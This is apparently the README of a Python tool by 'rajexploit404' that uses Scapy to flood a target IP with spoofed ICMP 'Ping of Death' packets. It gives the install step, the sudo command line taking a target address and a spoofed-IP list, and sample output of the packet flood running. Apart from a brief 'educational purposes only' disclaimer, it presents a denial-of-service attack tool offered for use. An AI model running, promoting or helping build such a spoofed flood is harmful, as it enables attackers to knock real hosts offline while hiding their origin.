# Simple DDoS with IP Spoofing by **rajexploit404**

A straightforward Python script for **Ping of Death (PoD)** attacks with IP spoofing. Built for educational and research purposes only. Misuse of this tool is strictly prohibited.

---

## **Features**
- Uses **Scapy** to send spoofed ICMP packets.
- Supports **multi-threading** and **multi-processing** for optimal performance.
- Customizable input for spoofed IP lists and target IPs.

---

## **Banner**

```plaintext
  ██████╗  █████╗      ███████╗███████╗███████╗ ██████╗
 ██╔════╝ ██╔══██╗     ██╔════╝██╔════╝██╔════╝██╔═══██╗
 ██║  ███╗███████║     ███████╗█████╗  █████╗  ██║   ██║
 ██║   ██║██╔══██║     ╚════██║██╔══╝  ██╔══╝  ██║   ██║
 ╚██████╔╝██║  ██║     ███████║███████╗██║     ╚██████╔╝
  ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚══════╝╚═╝      ╚═════╝
 
  Simple PoD with IP Spoofed by rajexploit404
```

---

## **Requirements**
1. **Python 3.8+**
2. **Scapy Library**: Install using:
   ```bash
   pip install scapy
   ```
3. Root privileges (**sudo**) are required for sending raw packets.

---

## **Usage**
Run the script with the following syntax:
```bash
sudo python3 main.py <target_ip> <spoofed_ip_list>
```

### **Parameters**
- **`<target_ip>`**: The target IP address to flood.
- **`<spoofed_ip_list>`**: File containing spoofed IP addresses, one per line.

---

## **Example**

```bash
┌──(rajexploit404㉿rajsec)-[~/POD]
└─$ sudo python3 main.py 123.123.123.123 spoof.txt
```

Output:

```plaintext
  ██████╗  █████╗      ███████╗███████╗███████╗ ██████╗
 ██╔════╝ ██╔══██╗     ██╔════╝██╔════╝██╔════╝██╔═══██╗
 ██║  ███╗███████║     ███████╗█████╗  █████╗  ██║   ██║
 ██║   ██║██╔══██║     ╚════██║██╔══╝  ██╔══╝  ██║   ██║
 ╚██████╔╝██║  ██║     ███████║███████╗██║     ╚██████╔╝
  ╚═════╝ ╚═╝  ╚═╝     ╚══════╝╚══════╝╚═╝      ╚═════╝

  Simple PoD with IP Spoofed by rajexploit404

[?] Loaded 3000 spoofed IPs from spoof.txt
[?] Starting packet flood...
[+] Packet sent from 31.147.186.29 to 123.123.123.123
[+] Packet sent from 28.160.190.195 to 123.123.123.123
[+] Packet sent from 136.91.104.67 to 123.123.123.123
[+] Packet sent from 165.98.179.114 to 123.123.123.123
[+] Packet sent from 176.40.228.221 to 123.123.123.123
[+] Packet sent from 93.161.149.146 to 123.123.123.123
```

---

## **Invalid Usage**

If the script is run without `sudo` or with insufficient arguments, the following error is displayed:

```plaintext
[!] This script must be run with sudo privileges!
Usage: sudo python3 main.py <target_ip> <spoofed_ip_list>
```

---

## **Disclaimer**
This tool is for **educational purposes only**. Use it responsibly and only with the explicit permission of the target. Misuse can result in legal consequences.
